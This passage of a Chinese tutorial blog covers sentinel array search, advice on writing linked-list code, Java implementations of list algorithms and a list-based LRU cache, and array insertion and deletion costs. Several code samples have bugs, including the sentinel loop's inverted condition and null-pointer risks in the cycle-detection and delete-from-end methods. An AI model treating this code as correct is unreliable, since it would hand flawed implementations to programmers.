在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度// 为了更好的解释，这里举了个例子来说明// a = &#123;4,2,3,5,9,6&#125; key = 7int find(char* a, int n, char key)&#123; // 边界条件处理，如果a为空，或者n&lt;=0 if(a == null || n&lt;=0)&#123; return -1; &#125; // 这里因为要将a[n-1]设为哨兵，所以特殊处理这个值 if(a[n-1] == key)&#123; return n-1; &#125; // 临时变量保存a[n-1]，以便之后恢复，这里temp = 6 char temp = a[n-1]; // 把key值放到数组a[n-1]，此时a=&#123;4,2,3,5,9,7&#125; a[n-1] = key; int i=0; // 此时while循环比起代码一，少了i&lt;n这个比较操作 while(a[i] == key)&#123; ++i; &#125; // 将数组a[n-1] 恢复为原来的值 a[n-1] = temp; // 如果i = n-1，说明数组中没有要找的key if(i == n-1)&#123; return -1; &#125; // 否则，说明找到了key，位置为i else&#123; return i; &#125;&#125; 对比两段代码，在字符串a很长的时候，比如几万、几十万，你觉得那段代码执行更快呢？答案是代码二。因为两端代码中执行次数最多的就是while循环那一部分。在第二段代码中，我们通过一个哨兵a[n-1]=key，成功省掉了一个比较语句，不要小看了这一句，当积累上万次、几十万次的时候，累积的时间就很明显了。 当然，这里只是说明哨兵的作用，写代码的时候千万不要写成第二段代码那样，可读性太差了，大部分情况下，我们并不需要追求如此极致的性能。 重点留意边界条件处理软件开发中，代码在以下边界或者异常情况下，最容易产生bug。链表代码也不例外，要实现没有bug的链表代码，一定要在编写的过程中以及编写完成后，检查边界条件是否考虑全面，以及边界条件下代码是否能运行。 我经常用来检查链表代码是否正确执行的边界条件有这么几个： 如果链表为空时，代码是否能正常工作？ 如果一个链表只包含了一个结点，代码能否正常工作？ 如果链表只包含两个结点时，代码能否正常工作？ 代码逻辑在处理头结点和尾结点时，是否能正常工作？ 当你写完链表代码之后，除了看下你写的代码在正常情况下能否工作，还要看下在上面我列举的杰哥边界条件下，代码能否正常工作。 当然边界条件不止我列举的这些，针对不同的场景，可能还有特定的边界条件，需要自己去思考，不过套路都是一样的。 其实，不光是写链表代码，在写任何代码的时候，千万不要只是实现业务正常情况下的功能就行了，一定要多想想会遇到哪些边界情况或者异常情况，遇到了应该如何应对，这样写出来的代码才够健壮。 举列画图，辅助思考对于稍微复杂的链表操作，比如前面我们提到的单链表反转，指针一会指这，一会指那，总感觉脑容量不够，想不清楚。这时候可以采用举列法和画图法，来进行辅助分析。 你可以找一个具体的例子，把它画在纸上，释放一些脑容量，留更多的给逻辑思考，这样就会感觉思路清晰很多。比如往单链表中插入一个结点，可以先把各种情况都举一个例子，画出插入前和插入后的链表变化，如图所示： 看着图写代码，是不是简单多了。而且当我们写完代码之后，也可以举几个例子，画在纸上，照着代码走一遍，很容易发现代码中的Bug。 多写多练，没有捷径如果你已经理解并掌握了这些方法，但是手写代码还是会出现各种各样的错误，也不要着急，多写多练。把常见的链表操作多写几遍，出问题就一点点调试，熟能生巧。 下面我精选了5个常见的链表操作，这要把这几个操作写熟练，不熟就多练几遍，保证之后不会在害怕写链表代码。 单链表反转 链表中环的检测 两个有序链表合并 删除链表倒数第n个结点 求链表的中间结点 我觉得，写链表代码是最考验逻辑思维能力的，因为链表到处都是指针的操作，边界条件的处理，一个不慎就会产生bug。链表代码写的好坏，可以看出一个人写代码是否细心，考虑问题是否全面，思维是否缜密，所以很多面试都喜欢让人手写链表代码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189/** * 链表的一些算法题目 */public class LinkListAlgorithm &#123; public static void main(String[] args) &#123; // 第一个链表，检测是否有环 System.out.println("链表中环的检测"); Node&lt;Integer&gt; n1 = new Node&lt;&gt;(1); Node&lt;Integer&gt; n2 = new Node&lt;&gt;(2); Node&lt;Integer&gt; n3 = new Node&lt;&gt;(3); n1.next = n2; n2.next = n3; n3.next = n1; // 1-&gt;2-&gt;3-&gt;1 System.out.println(isLoop(n1)); // true System.out.println("=========================================="); // 链表反转 System.out.println("链表反转"); Node&lt;Integer&gt; n4 = new Node&lt;&gt;(4); Node&lt;Integer&gt; n5 = new Node&lt;&gt;(5); Node&lt;Integer&gt; n6 = new Node&lt;&gt;(6); Node&lt;Integer&gt; n7 = new Node&lt;&gt;(7); n4.next = n5; n5.next = n6; n6.next = n7; System.out.println(printLinkList(n4)); // 4-&gt;5-&gt;6-&gt;7 Node&lt;Integer&gt; head = reverse(n4); System.out.println(printLinkList(head)); // 7-&gt;6-&gt;5-&gt;4 System.out.println("=========================================="); // 求链表的中间节点 System.out.println("求链表的中间节点"); Node&lt;Integer&gt; n8 = new Node&lt;&gt;(8); Node&lt;Integer&gt; n9 = new Node&lt;&gt;(9); Node&lt;Integer&gt; n10 = new Node&lt;&gt;(10); Node&lt;Integer&gt; n11 = new Node&lt;&gt;(11); Node&lt;Integer&gt; n12 = new Node&lt;&gt;(12); n8.next = n9; n9.next = n10; n10.next = n11; n11.next = n12; // 8-&gt;9-&gt;10-&gt;11-&gt;12 System.out.println(printLinkList(n8)); Node&lt;Integer&gt; mid = middle(n8); System.out.println("中间节点是： " + mid.val); // 10 System.out.println("=========================================="); // 有序链表合并 System.out.println("有序链表合并"); Node&lt;Integer&gt; n13 = new Node&lt;&gt;(13); Node&lt;Integer&gt; n14 = new Node&lt;&gt;(14); Node&lt;Integer&gt; n15 = new Node&lt;&gt;(15); n13.next = n14; n14.next = n15; System.out.println("第一个链表： "+printLinkList(n8)); System.out.println("第二个链表： "+printLinkList(n13)); head = merge(n8, n13); System.out.println("合并后的链表： "+printLinkList(head)); System.out.println("=========================================="); // 删除倒数第2个节点 Node&lt;Integer&gt; n16 = new Node&lt;&gt;(16); Node&lt;Integer&gt; n17 = new Node&lt;&gt;(17); Node&lt;Integer&gt; n18 = new Node&lt;&gt;(18); Node&lt;Integer&gt; n19 = new Node&lt;&gt;(19); n16.next = n17; n17.next = n18; n18.next = n19; System.out.println("删除前： "+printLinkList(n16)); head = deleteLastKDesc(n16, 3); System.out.println("删除后： "+printLinkList(n16)); &#125; /** 合并两个有序链表 */ private static Node&lt;Integer&gt; merge(Node&lt;Integer&gt; n1, Node&lt;Integer&gt; n2) &#123; // 确定新链表头结点 Node&lt;Integer&gt; head, p = n1, q = n2; if (p.val &gt; q.val)&#123; head = n2; q = q.next; &#125;else&#123; head = n1; p = p.next; &#125; Node&lt;Integer&gt; r = head; while (p!=null &amp;&amp;q!=null)&#123; if (p.val &lt; q.val)&#123; r.next = p; p = p.next; &#125;else &#123; r.next = q; q = q.next; &#125; r = r.next; &#125; if (p!=null)&#123; r.next = p; &#125;else&#123; r.next = q; &#125;; return head; &#125; /**查找链表中间节点*/ private static Node&lt;Integer&gt; middle(Node&lt;Integer&gt; head) &#123; if (head==null) return null; Node&lt;Integer&gt; p = head; Node&lt;Integer&gt; q = head; while (q.next !=null &amp;&amp; q.next.next!=null)&#123; q = q.next.next; p = p.next; &#125; return p; &#125; /** 链表中环的检测*/ private static boolean isLoop(Node&lt;Integer&gt; head)&#123; // 采用快慢指针法 如果两个指针相遇，则说明有环 Node&lt;Integer&gt; p = head; Node&lt;Integer&gt; q = head.next.next; while (q!=null)&#123; p = p.next; q = q.next.next; if (q == p)&#123; return true; &#125; &#125; return false; &#125; /**反转链表*/ private static Node&lt;Integer&gt; reverse(Node&lt;Integer&gt; head)&#123; if (head.next == null)return head; Node&lt;Integer&gt; p; Node&lt;Integer&gt; q; Node&lt;Integer&gt; r; p = head; q = p.next; p.next = null; while (q != null)&#123; r = q.next; q.next = p; p = q; q = r; &#125; return p; &#125; /**删除链表倒数第K个结点*/ private static Node&lt;Integer&gt; deleteLastKDesc(Node&lt;Integer&gt; head, int k)&#123; if (head == null || k &lt;0) return null; Node&lt;Integer&gt; p = head; while (p != null)&#123; p = p.next; k--; &#125; if (k == 0)&#123; return head.next; &#125; if (k &lt; 0)&#123; p = head; while (++k != 0)&#123; p = p.next; &#125; p.next = p.next.next; &#125; return p; &#125; private static class Node&lt;E&gt; &#123; E val; Node&lt;E&gt; next; Node(E e)&#123; this.val = e; &#125; &#125; private static String printLinkList(Node&lt;Integer&gt; head)&#123; StringBuilder sb = new StringBuilder(); sb.append("["); while (head !=null)&#123; if (head.next !=null) sb.append(head.val).append(", "); else sb.append(head.val); head = head.next; &#125; sb.append("]"); return sb.toString(); &#125;&#125; (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-链表]]></title>
    <url>%2Fposts%2F2018-09-12-%E7%AE%97%E6%B3%95-%E9%93%BE%E8%A1%A8.html</url>
    <content type="text"><![CDATA[前言 今天我们来聊聊“链表 LinkedList”这个数据结构，学习链表有什么用呢，我们先来讨论一个经典的链表使用场景，那就是LRU缓存淘汰算法。 缓存是一种提高数据读取性能的技术，在硬件设计、软件开发中都有着非常广泛的应用，比如常见的CPU缓存、数据库缓存、浏览器缓存等等。 缓存的大小有限，当缓存被占满时，那些数据应该被清理出去，那些数据应该被保留？这就需要缓存淘汰策略来决定。常见的策略有这么三种：先进先出策略FIFO(First In First Out)、最少使用策略LFU(Least Frequently Used)、最近最少使用策略LRU(Least Recently Used)。 今天我们的问题是，怎样用链表来实现一个LRU缓存淘汰策略？ 链表及其结构 相比数组，链表是一种稍微复杂一点的数据结构，掌握起来也要比数组要困难一些。数组和链表是两个非常基础、非常常用的数据结构。所以要掌握甚至精通，同时理解其思想。 我们先从底层存储结构来看一下二者的区别： 为了直观的对比，我画了一张图，从图中可以看到，数组需要一块连续的内存空间来存储，对内存的要求比较高，如果我们申请一个100MB大小的内存空间，当内存中没有连续的、足够大的内存空间时，即便剩余的总空间大于100MB，仍然会申请失败。 而链表恰恰相反，它并不需要一块连续的内存空间，他通过“指针”将一组零散的内存块连接起来使用，所以申请一块大小是100MB的链表，根本不会有问题。 链表的结构五花八门，今天我们着重介绍三种最常用的链表结构：单链表、双向链表、循环链表。 单链表首先来看最简单、最常用的单链表。我们刚讲到，链表是用指针将一组零散的内存块串联在一起，其中，我们把内存块称为链表的“结点”。为了使所有的节点串联起来，每个链表的结点出了需要保存数据之外，还需要记录链上下一个结点的地址，如图所示，我们把这个记录下一个结点指针地址的指针叫做后继指针 next。 从上面单链表的结构图中，可以发现，单链表中有两个结点是比较特殊的，分别是第一个节点和最后一个结点，我们习惯性的把第一个结点称为头结点，最后一个节点称为尾结点。其中头结点用来记录链表的基地址，我们可以通过它遍历得到整个链表。而尾结点的特殊之处在于，指针不是指向下一个结点，二是指向了一个空地址null，表示这是链表的最后一个结点。 与数组一样，链表也支持数据的插入、查找、删除操作。我们知道在进行数组的插入、删除操作时，为了保持内存的连续性，需要做大量的数据搬移操作，所以时间复杂度是O(n)。而在链表中插入或者删除一个数据，我们并不需要保持内存的连续性而搬移结点，因为链表本身的存储空间就不是连续的。所以在链表中插入删除一个数据是非常快的。 为了方便理解，我画了一张图，从图中我们可以看出，针对链表的插入和删除操作，我们只需要考虑相邻结点的指针改变，所以对应的时间复杂度为O(1)。 但是有利就有弊，链表想要随机访问第K个元素就没有数组那么高效了。因为链表中的数据并非是连续存储的，所以无法像数组那样，根据首地址和下标，通过寻址公式就可以直接计算出对应的内存地址，而是需要一个一个结点依次遍历，直到找到对应的结点。 你可以把链表想象成一个队伍，每个人都知道自己前面的人是谁，所以当我们希望知道排在第K为的人是谁的时候，就需要从第一个人开始，一个一个往下数。所以链表随机访问的性能没有数组好，时间复杂度为O(n)。 好了，单链表了解了，下面来看看另外两个复杂的链表：循环链表和双向链表。 循环链表循环链表是一种特殊的单链表。实际上，循环链表也很简单，它和单链表唯一的区别就在尾结点。我们知道，单链表的尾结点是指向空地址，表示这是最后的节点了，而循环链表的尾结点的指针是指向链表的头结点。从下图中可以看出，循环链表想一个环一样首尾相连，所以叫循环链表。 和单链表相比，循环链表的优点是从链尾到链头比较方便。当要处理的数据具有环形结构特点时，就特别适合采用循环链表，比如著名的约瑟夫问题。尽管用单链表也可以实现，但是用循环链表的话，代码就会简洁很多。 双线链表接下来再看一个稍微复杂，在实际的软件开发中，也更加常见的链表结构：双向链表。 单链表只有一个方向，节点只有一个后继指针，next指向后面的结点。而双向链表，顾名思义，它支持两个方向，每个结点不止有一个后继指针next指向后面的结点，还有一个前驱指针prev指向前面的结点。 从上图可以看出，双向链表需要额外的两个空间来存储后继结点和前驱结点的地址。所以，如果存储同样多的数据，双向链表要比单向链表占用更多的内存空间。虽然两个指针比较浪费存储空间，但可以支持双向遍历，这样也带来了双向链表的操作灵活性。那相比单向链表，双向链表适合解决哪种问题呢？ 从结构上来看，双向链表可以支持O(1)时间复杂度的情况下找到前驱结点，正是这样的特点，也使双向链表在某些情况下的删除、插入操作比单链表要简单、高效。 你可能会说，单链表的插入、删除操作的时间复杂度都已经是O(1)了，双向链表还能怎么高效呢？别着急，刚刚的分析比较偏理论，很多数据结构和算法的书籍也是这么说得，但是这种说法实际上是不准确的，或者说是有先觉条件的。 我们再来分析一下链表的两个操作，先来看删除操作。在实际的软件开发中，从链表中删除一个数据无外乎这两种情况： 删除结点中“值等于某个给定值的”结点 删除给定指针指向的结点 对于第一种情况，不管是单链表还是双向链表，为了查找到值等于某个给定值的结点，都需要从头开始一个一个依次遍历对比，知道找到值等于给定值的结点，再通过前面讲的指针操作将其删除。 尽管单纯的删除操作时间复杂度都是O(1)，但是遍历查找的时间是主要的耗时点，对应的时间复杂度为O(n)，根据时间复杂度分析中的加法法则，删除值等于给定值的结点对应的链表操作的总时间复杂度为O(n)。 对于第二种情况，我们已经找到了要删除的结点，但是删除某个结点q需要知道前驱结点，而单链表并不支持直接获取前驱结点，所以为了找到前驱结点，我们还是要从头结点开始遍历链表，知道p-&gt;next = q，说明p是q的前驱结点。 但是对于双向链表来说，这种情况就比较有优势了。因为双向链表中的结点已经保存了前驱结点的指针，不需要像单链表那样遍历。所以针对第二种情况，单链表删除操作需要O(n)的时间复杂度，而双向链表只需要在O(1)的时间复杂度内就搞定了！ 同理，如果我们希望在链表的某个指定结点前面插入一个结点，双向链表比单链表有很大优势，双向链表可以在O(1)时间复杂度搞定，而单向链表需要O(n)的时间复杂度。 除了插入、删除操作有优势之外，对于一个有序链表，双向链表的按值查找的效率也要比单向链表高一些。因为我们可以记录上次查找的位置p，每次查询时，根据要查找的值与p的大小关系，决定是向前查找还是往后查找，所以平均只需要查找一半的数据。 现在，有没有觉得双向链表比单向链表更加高效呢？这就是问什么在实际的软件开发中，双向链表尽管比较费内存，但还是比单链表的应用更加广泛的原因。如果你熟悉Java语言，你肯定用过LinkedHashMap这个容器，如果你深入研究LinkedHashMap的实现原理，就会发现其中就用到了双向链表这种数据结构。 实际上，这里有一个更重要的知识点需要你掌握，那就是用空间换时间的设计思想。当内存空间充足时，如果我们更追求代码的执行速度，我们就可以选择空间复杂度相对较高，但时间复杂度相对较低的算法和数据结构。相反，如果内存比较紧缺，比如代码跑在手机或者单机片中，这个时候，就要反过来用时间换空间的涉及思路。 还是开篇缓存的例子，缓存实际上就是利用了空间换时间的例子。虽然我们将数据存放在磁盘上，会比较节省内存，但是每次查询数据都要查询一遍磁盘，会比较慢。但是我们通过缓存技术，事先将数据加载在内存中，虽然会比较耗费内存空间，但是每次查询数据的速度就大大提高了。 所以对于执行较慢的程序，可以通过消耗更多的内存(空间换时间)进行优化；而消耗过多内存的程序，可以通过消耗更多的时间(时间换空间)来降低内存的消耗。你还能想到其他时间换空间或者空间换时间的例子吗？ 了解了循环链表和双向链表，如果把这两种链表整合在一起就是一个新的版本：双向循环链表。我想不需要我多讲，你应该知道双向循环链表长什么样子了吧？ 链表 VS 数组性能大比拼 通过前面的学习，你应该知道，数组和链表是两种截然不同的内存组织方式，正是因为内存存储的区别，他们插入、删除、随机访问的时间复杂度正好相反。 时间复杂度 数组 链表 插入删除 O(n) O(1) 随机访问 O(1) O(n) 不过，数组和链表的对比，并不能局限于时间复杂度。而且，在实际的软件开发中，不能仅仅利用复杂度分析就能决定使用那哪个数据结构来存储数据。 数组简单易用，在实现上使用的是连续的内存空间，可以借助CPU的缓存机制，预读数组中的数据，所以访问效率更高。而链表在内存中并不是连续存储，所以对CPU缓存并不好，没办法有效预读。 数组的缺点是大小固定，一经声明就要占用整块连续内存空间。如果声明的数组过大，可能没有足够的连续内存空间分配给它，导致“内存不足”。如果声明的数组过小，则可能出现不够用的情况，这时只能再申请一个更大的内存空间，把原数组拷贝进去，非常费时。链表本身没有大小的限制，天然的支持动态扩容，我觉得这也是它与数组最大的区别。 你可能会说，Java中也有ArrayList容器，也可以支持动态扩容啊？我们上一节已经讲过，当我们往支持动态扩容的数组中插入一个数据时，如果数组中没有空闲空间了，就会申请一个更大的空间，将原数组拷贝过去，而数据拷贝的操作是非常耗时的。 我举一个稍微极端的例子。如果我们用ArrayList存储了1GB大小的数据，这个时候已经没有空闲空间了，当我们再插入数据的时候，ArrayList会申请一个1.5GB的存储空间，并且把原来那1GB的数据拷贝到新申请的空间上，听起来是不是就很耗时。 除此之外，如果你的代码对内存的使用非常苛刻，那数组就更适合你。因为链表中的每个结点都需要消耗额外的内存空间去存储一份指向下一个结点的指针，所以内存消耗会翻倍。而且，对链表进行频繁的插入、删除操作，还会导致频繁的内存申请和释放，容易造成内存碎片，如果是java语言，就有可能会导致频繁的GC(Garbage Collection 垃圾回收)。 所以在实际的开发项目中，要根据不同的项目情况，权衡究竟是选择数组还是链表。 解答开篇 好了，我们现在回过头来看，如何基于链表实现LRU缓存淘汰算法？ 我的思路是这样的：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的。当有一个新数据被访问时，我们从链表头部开始顺序遍历链表。 如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，再插入到链表的头部。 如果此数据没有缓存在链表中，又可以分为两种情况： 如果此时缓存未满，则将此结点直接插入到链表的头部； 如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。 这样我们就实现了一个LRU缓存，是不是很简单。 现在我们来看下缓存访问的时间复杂度是多少。因为不管缓存有没有满，我们都需要遍历一遍链表，所以这种基于链表的实现思路，缓存访问的时间复杂度为O(n)。 实际上，我们可以继续优化这个实现思路，比如引入哈希表(hash table)来记录每个数据的位置，将缓存访问的时间复杂度降到O(1)。这个优化方案，等讲到哈希表的时候再讲。 基于链表的实现思路，实际上还可以用数组来实现LRU缓存淘汰策略。如何利用数组实现LRU缓存淘汰策略？ 内容小结 今天我们讲了一种跟数组“相反”的数据结构，链表。他跟数组一样，也是非常基础、非常常用的数据结构。不过链表要比数组稍微复杂，从普通链表衍生出来好几种链表结构，比如双向链表、循环链表、双向循环链表。 和数组相比，链表更适合插入、删除操作频繁的场景，查询的时间复杂度较高。不过在具体的软件开发中，要对数组和链表的各种性能进行对比，综合来使用两者中的一个。 课后思考 如何判断一个字符串是否是回文字符串呢？今天的思考题就是基于这个问题的改造版本。如果字符串是通过单链表来存储的，那如何来判断是一个回文串呢？相应的时间空间复杂度是多少。 (adsbygoogle = window.adsbygoogle || []).push({}); 本章代码：GitHub 带头单链表代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211import java.util.NoSuchElementException;public class SinglyLinkedList&lt;T&gt;&#123; private Node&lt;T&gt; head; private int size; public SinglyLinkedList()&#123; this.head = new Node&lt;&gt;(null); &#125; // 链表头部插入值 private void linkFirst(Node&lt;T&gt; newNode)&#123; newNode.next = head.next; head.next = newNode; size++; &#125; // 链表尾部插入值 public void linkLast(T val)&#123; Node&lt;T&gt; newNode = new Node&lt;&gt;(val); linkLast(newNode); &#125; private void linkLast(Node&lt;T&gt; newNode)&#123; Node&lt;T&gt; p = head; while (p.next!=null)&#123; p=p.next; &#125; p.next = newNode; size++; &#125; // 获取头部值 public T getFirst()&#123; if (head.next == null)&#123; throw new NoSuchElementException(); &#125; return head.next.val; &#125; // 获取尾部值 public T getLast()&#123; Node&lt;T&gt; p = head.next; while (p.next!=null)&#123; p = p.next; &#125; return p.val; &#125; // 添加 public void add(T val)&#123; Node&lt;T&gt; newNode = new Node&lt;&gt;(val); linkLast(newNode); &#125; // 在某处索引插入 public void add(int index, T val)&#123; Node&lt;T&gt; newNode = new Node&lt;&gt;(val); Node&lt;T&gt; p = node(index); insert(p, newNode); &#125; private void insert(Node&lt;T&gt; p, Node&lt;T&gt; newNode)&#123; Node&lt;T&gt; q = head; while (q!=null &amp;&amp; q.next!=p)&#123; q = q.next; &#125; if (q == null)&#123; return; &#125; newNode.next = p; q.next = newNode; &#125; // 根据值删除某个节点 public boolean delete(T val)&#123; Node&lt;T&gt; p = head; while (p.next !=null &amp;&amp; !p.next.val.equals(val))&#123; p = p.next; &#125; if (p.next== null)&#123; return false; &#125; p.next = p.next.next; return true; &#125; // 根据索引删除某结点 public T delete(int index)&#123; Node&lt;T&gt; deleteNode = node(index); return deleteNode(deleteNode); &#125; private T deleteNode(Node&lt;T&gt; deleteNode)&#123; final T element = deleteNode.val; Node&lt;T&gt; p = head; while (p.next!= null &amp;&amp; p.next != deleteNode)&#123; p = p.next; &#125; if (p.next == null)&#123; return null; &#125; p.next = deleteNode.next; return element; &#125; // 根据索引获取值 public T get(int index)&#123; if (index &gt;= size || index &lt; 0)&#123; throw new IndexOutOfBoundsException("Index: "+index + ", Size: "+size); &#125; return node(index).val; &#125; // 通过value 查找对应的索引 public int indexOf(T val)&#123; int index = 0; Node&lt;T&gt; p = head; while (p.next !=null &amp;&amp; p.next.val!=val)&#123; p = p.next; index ++; &#125; if (p.next == null)&#123; index = -1; &#125; return index; &#125; public boolean contains(T val)&#123; Node&lt;T&gt; p = head; while (p.next !=null &amp;&amp; p.next.val!=val)&#123; p = p.next; &#125; return p.next != null; &#125; private Node&lt;T&gt; node(int index)&#123; if (index &gt;= size || index &lt; 0)&#123; throw new IndexOutOfBoundsException("Index: "+index + ", Size: "+size); &#125; Node&lt;T&gt; p = head.next; int i=0; while (i&lt;size)&#123; if (i == index)&#123; break; &#125; p = p.next; ++i; &#125; return p; &#125; public void push(T val)&#123; Node&lt;T&gt; newNode = new Node&lt;&gt;(val); linkFirst(newNode); &#125; public T pop()&#123; return unlinkedFirst(); &#125; private T unlinkedFirst()&#123; Node&lt;T&gt; first = head.next; if (first == null)&#123; throw new RuntimeException("没有元素"); &#125; return unlinkedFirst(first); &#125; private T unlinkedFirst(Node&lt;T&gt; node)&#123; final T element = node.val; head.next = head.next.next; node.next = null; node.val = null; size--; return element; &#125; // 单链表反转 public void reverse()&#123; // 链表为空或者链表只有一个元素时 if (head.next == null || size &lt;=1 )&#123; return; &#125; Node&lt;T&gt; p = head.next; Node&lt;T&gt; q = p.next; Node&lt;T&gt; r; p.next = null; while (q !=null)&#123; r = q.next; q.next = p; p = q; q = r; &#125; head.next = p; &#125; public int size()&#123; return size; &#125; // 打印链表 example: [1, 2, 3] @Override public String toString() &#123; if (head.next == null)&#123; return "[]"; &#125; StringBuilder sb = new StringBuilder(); sb.append("["); Node&lt;T&gt; p = head.next; while (p.next!=null)&#123; sb.append(p.val).append(", "); p = p.next; &#125; sb.append(p.val).append("]"); return sb.toString(); &#125; public static class Node&lt;T&gt;&#123; private T val; private Node&lt;T&gt; next; Node(T val)&#123; this.val = val; &#125; &#125;&#125; 基于链表的LRU缓存代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182public interface LRUCache&lt;T&gt; &#123; void put(T val); T get(T val); int Size();&#125;class ListLRUCache&lt;T&gt; implements LRUCache&lt;T&gt; &#123; private SinglyLinkedList&lt;T&gt; lruList; private static final int DEFAULT_CAP=10; // 缓存容量 private int cap; // 缓存使用大小 private int size; public ListLRUCache()&#123; this(DEFAULT_CAP); &#125; public ListLRUCache(int cap)&#123; this.cap = cap; this.lruList = new SinglyLinkedList&lt;&gt;(); &#125; @Override public void put(T value) &#123; // 1、缓存满了 // 如果该列表中没有该数据 if (size == cap)&#123; // 1、缓存满了 // 删除最后一个节点 lruList.delete(size-1); // 将该数据插入到链表头部 lruList.push(value); &#125;else &#123; // 2、缓存未满 // 直接在列表头部插入该数据 lruList.push(value); size++; &#125; &#125; @Override public T get(T val) &#123; T result = null; if (lruList.contains(val))&#123; // 在list中,从list中获取该数据 int index = lruList.indexOf(val); result = lruList.get(index); System.out.println("从缓存中获取"); // 将该节点插入到链表头部 lruList.delete(index); lruList.push(val); &#125;else&#123; // 如果该列表中没有该数据 System.out.println("缓存中没有该数据！"); if (size == cap)&#123; // 1、缓存满了 // 删除最后一个节点 lruList.delete(size-1); // 将该数据插入到链表头部 lruList.push(val); System.out.println("缓存已满！将该数据插入到缓存"); &#125;else &#123; // 2、缓存未满 // 直接在列表头部插入该数据 lruList.push(val); size++; System.out.println("将该数据直接插入到缓存"); &#125; // 如果有数据库，该数据从数据库中获取 result = val; &#125; return result; &#125; public int Size()&#123; return size; &#125;&#125; 字符串是否是回文字符串：12]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-数组]]></title>
    <url>%2Fposts%2F2018-09-10-%E7%AE%97%E6%B3%95-%E6%95%B0%E7%BB%84.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({}); 前言 提到数组，我想你肯定不陌生，甚至还会自信的说他很简单。 是的，在每一种编程语言中，基本都会有数组这种数据类型。尽管数组看起来非常基础、简单，但是我估计很多人都没有理解这个基础数据结构的精髓。 在大部分的数据结构中，数组都是从0开始编号的，但是为什么数组要从0开始，而不是1开始呢？从1开始不是更符合人类的思维习惯吗？下面我们通过本篇文章来认识这个问题。 数组如何实现随机访问？ 什么是数组呢？数组是一种线性表结构，它用一组连续的内存空间，来存储一组具有相同数据类型的数据。 这里有几个关键词： 第一是线性表。顾名思义，线性表就是数据像一条线一样的结构。每个线性表上的数据最多只有前后两个方向。除了数组，链表、队列、栈等也是线性表结构。 与线性表相对应的概念是非线性表，比如二叉树、堆、图，之所以叫非线性，是因为在非线性表中，数据之间并不是简单的前后关系。 第二个是连续的内存空间和相同类型的数据。正是因为这两个限制，所以才有一个堪称杀手锏的特性：“随机访问”。但有利就有弊，这两个限制也让数组的很多操作变得非常低效，比如在数组中插入、删除一个数据，为了保证连续性，就需要做大量的数据搬移工作。 说到数据的随机访问，那么数组是如何实现很具下标随机访问数组元素的吗？ 我们拿一个长度为10的int类型的数组int[] a = new int[10] 来举例。在如下图中，假设计算机给数组a[10] 分配了一块连续的内存空间000-039，其中首地址为000。 我们知道计算机会给每个内存单元分配一个地址，计算机通过地址来访问内存中的数据。当计算机需要随机访问某个数组元素时，它会通过寻址公式，计算出该元素的内存地址。 $$ a[i]\_address = base\_address + i * data\_type\_size $$ 其中base address表示数组的基地址，data_type_size表示数组中的每个元素的大小，在这个例子中，数组中存储的int类型，所以data_type_size就是4个字节。 很多人在面试中回答数组和链表的区别都会这么说：“链表适合插入、删除，时间复杂度为 O(1)；数组适合查找，查找时间复杂度为O(1)”。实际上这种表述是不准确的。数组是适合查找操作，但是查找的复杂度并不是O(1)，即便是排好序的数组，用二分查找时间复杂度也是$O(logN)$。所以正确的表述应该是数组的随机访问的复杂度是O(1)。 低效的“插入”和“删除”前面我们提到，数组为了保持内存数据的连续性，会导致插入、删除操作比较低效，现在我们就来看看究竟为什么会导致低效？ 插入操作假设数组的长度为n，现在需要将一个数据插入到数组中的第k个位置。为了把第k个位置腾出来，我们需要将k-n这部分的元素都往后顺挪一位。 如果是在数组的末尾插入元素，那就不需要移动数据，时间复杂度为O(1)；但是如果在数组开头插入一个元素，那所有的元素都需要后移一位，所以最坏时间复杂度为O(n)；因为在每个位置插入元素的概率是一样的，所以平均时间复杂度为$ (1+2+3+…+n)/n = O(n) $ 。 所以对于插入的时间复杂度：最好的O(1)，最坏O(n)，平均O(n)。 如果数组中的元素是有序的，并且插入新元素也要保证数组有序，那么就必须按照刚才的方法移动数据。但是如果数组中存储的数据没有任何规律，只是被当来存储数据的集合，那么如果在k处插入一个数据，可以将k处的数据移到数组的末尾，然后替换k处数据为要插入的数据，这种插入处理技巧可以将时间复杂度降为O(1)。 删除操作跟插入数据类似，如果要删除第k个位置的数据，为了保持内存的连续性，也需要搬迁数据，不然数组中间就会出现断层，内存就不连续了。 和插入类似，如果删除数组末尾的数据，则是最好时间复杂度为O(1)；如果删除开头的数据，则最坏时间复杂度为O(n)，平均情况时间复杂度也为O(n)。 实际上，在某些特殊场景下，我们并不一定追求数组中数据的连续性，如果我们将多次删除操作集中在一起执行，删除的效率是不是会提高很多呢？ 我们继续来看一个例子，数组a[10]中存储了8个元素：a,b,c,d,e,f,g,h。现在我们要依次删除a,b,c这三个元素。 为了避免d,e,f,g这几个数据会被搬移三次，我们可以先记录下已删除的数据，每次的删除并不是真正的搬移数据，只是记录数据已经被删除，当数组没有更多空间存储数据事，我们再进行一次真正的删除操作，这样就大大减少了删除数据之后导致的数据迁移。 